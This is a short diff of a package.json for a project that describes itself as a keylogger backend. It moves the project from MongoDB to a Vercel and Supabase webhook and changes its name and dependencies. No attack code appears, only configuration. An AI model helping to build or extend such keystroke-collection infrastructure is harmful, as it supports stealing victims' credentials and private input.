@@ -1,14 +1,14 @@
 {
-  "name": "samp-keylog-backend-mongodb",
-  "version": "2.0.0",
-  "description": "Keylogger Backend with MongoDB Atlas",
-  "main": "api/log.js",
+  "name": "keylog-backend-supabase",
+  "version": "1.0.0",
+  "description": "Keylogger Webhook with Vercel + Supabase",
+  "type": "module",
   "scripts": {
     "start": "node api/log.js",
     "dev": "vercel dev"
   },
   "dependencies": {
-    "mongodb": "^5.9.0"
+    "@supabase/supabase-js": "^2.39.0"
   },
   "devDependencies": {
     "vercel": "^32.0.0"
